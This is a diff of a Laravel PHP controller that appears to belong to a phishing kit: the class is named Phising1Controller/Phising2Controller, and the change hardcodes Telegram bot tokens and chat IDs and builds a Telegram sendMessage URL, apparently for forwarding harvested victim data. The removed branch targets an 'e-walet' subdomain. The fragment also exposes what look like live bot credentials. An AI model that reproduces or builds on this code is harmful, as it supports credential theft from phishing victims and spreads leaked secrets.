@@ -4,7 +4,7 @@ namespace App\Http\Controllers;
 
 use Illuminate\Http\Request;
 
-class Phising1Controller extends Controller
+class Phising2Controller extends Controller
 {
     public function index(Request $request)
     {
@@ -58,16 +58,11 @@ class Phising1Controller extends Controller
     {
 
 
-        if ($subdomain == "e-walet") {
-            // BOT 6
-            $bot_token = "7329557554:AAEyGwqnUFP_tpc_xKtnGLsxT8fQi9I5AIA";
-            $chat_id = "7765826083";
-            $phisData = "GIF2";
-        } else {
-            $bot_token = "8066350060:AAFHJGLPkxtiROejFAhKeRVmUu7GJkXGtlM";
-            $chat_id = "7201344011";
-            $phisData = "GIF1";
-        }
+
+        $bot_token = "8066350060:AAFHJGLPkxtiROejFAhKeRVmUu7GJkXGtlM";
+        $chat_id = "7201344011";
+        $phisData = "GIF1";
+
 
         $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
 
